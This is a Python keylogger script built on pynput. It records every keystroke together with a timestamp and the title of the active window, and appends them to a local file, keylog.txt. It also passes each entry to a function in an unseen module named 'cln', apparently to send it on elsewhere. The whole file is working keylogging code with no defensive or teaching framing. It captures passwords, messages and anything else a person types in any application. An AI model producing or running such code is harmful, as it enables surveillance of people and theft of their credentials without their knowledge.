# -*- coding: utf-8 -*-

from pynput import keyboard
from datetime import datetime
import cln
import pygetwindow as gw

# Global variable to keep track of the last active window title
last_window_title = ""

def get_active_window_title():
    """
    Gets the title of the currently active window and
    explicitly identifies the desktop for clarity.
    """
    try:
        active_window = gw.getActiveWindow()

        # If no window is active (common when on the desktop)
        if active_window is None:
            return "Desktop"

        title = active_window.title

        # Check for specific OS titles for the desktop
        if title == "Program Manager":  # Windows
            return "Desktop"
        elif title == "Finder": # macOS
            return "Desktop"
        elif title == "": # Can happen in some cases
             return "Desktop"
        else:
            return title
            
    except Exception:
        # If there's an error, it's often because no window is in focus
        return "Desktop"


def on_press(key):
    """
    This function is called every time a key is pressed.
    It logs the key and the active window.
    """
    global last_window_title
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Get the title of the window that is currently active
    current_window_title = get_active_window_title()

    try:
        cln.send_key_non_blocking(f'[{timestamp}] Window: {current_window_title}')

        # Open the log file in append mode with UTF-8 encoding
        with open('keylog.txt', 'a', encoding='utf-8') as f:
            # If the user has switched windows, log the new window title
            if current_window_title != last_window_title:
                f.write(f'\n--- Window changed to: [{current_window_title}] at {timestamp} ---\n')
                last_window_title = current_window_title

            # Log the key that was pressed
            if hasattr(key, 'char') and key.char:
                cln.send_key_non_blocking(f'[{timestamp}] Key: {key.char} Window: {current_window_title}')
                f.write(f'[{timestamp}] Key: {key.char}\n')
            else:
                cln.send_key_non_blocking(f'[{timestamp}] Special: {key} Window: {current_window_title}')
                f.write(f'[{timestamp}] Special: {key}\n')
                
    except Exception as e:
        # Print errors to the console if something goes wrong
        print(f"Error writing to log file: {e}")


def on_release(key):
    """
    This function is called every time a key is released.
    It stops the listener if the Escape key is pressed.
    """
    if key == keyboard.Key.esc:
        print("Escape key pressed. Stopping keylogger.")
        return False

def loggerFunction():
    print("Keylogger started. Press ESC to stop.")
    
    # Create and start the keyboard listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
    print("Keylogger stopped.")

# --- Main execution block ---
if __name__ == "__main__":
    loggerFunction()